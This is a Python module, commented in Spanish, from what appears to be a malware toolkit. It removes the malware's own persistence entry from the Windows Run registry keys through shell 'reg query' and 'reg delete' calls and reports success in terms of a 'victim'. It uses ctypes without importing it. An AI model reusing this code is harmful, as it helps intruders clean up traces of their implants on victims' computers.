
# MODULO PARA AUTOREMOVER EL MALWARE -> CREADO POR KIRARI

import os
import tempfile
import subprocess

from ..config import (NOMBRE_MALWARE,
					  RUTA_MALWARE_DESTINO,
					  NOMBRE_REGISTRO_MALWARE)

def windows_autoremover():

	def esAdministrador():
		try:
			return ctypes.windll.shell32.IsUserAnAdmin()
		except:
			return False

	#if os.path.isfile(RUTA_MALWARE_DESTINO):
	#	os.remove(RUTA_MALWARE_DESTINO)

	if not esAdministrador():
		consulta = 'REG QUERY "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /s'
		borrado = 'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /f'	

	else:
		consulta = 'REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /s'
		borrado = 'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /f'

	verficar = subprocess.Popen(consulta,shell=True,stdout=subprocess.PIPE)

	if (bytes(NOMBRE_MALWARE,'utf-8') in verficar.stdout.read()):
		os.system(borrado)
		return (True," [\033[1;32m+\033[0;39m] Bicho eliminado con exito \n")

	else:
		return (True," [\033[1;31mx\033[0;39m] No se ha encontrado un bicho implantado en el cerebro victima \n")


def linux_autoremover():
	return (False," [\033[1;31mx\033[0;39m] No se ha encontrado un bicho implantado todavia \n")

def mac_autoremover():
	return (False," [\033[1;31mx\033[0;39m] No se ha encontrado un bicho implantado todavia \n")


def activar(plataforma):

	if plataforma=="win":
		proceso,msg = windows_autoremover()
		return proceso,msg

	elif plataforma=="linux":
		proceso,msg = linux_autoremover()
		return proceso,msg

	elif plataforma=="darwin":
		proceso,msg = mac_autoremover()
		return proceso,msg

	else:
		return (False," [\033[1;31mx\033[0;39m] No se ha detectado a la especie buscada\n")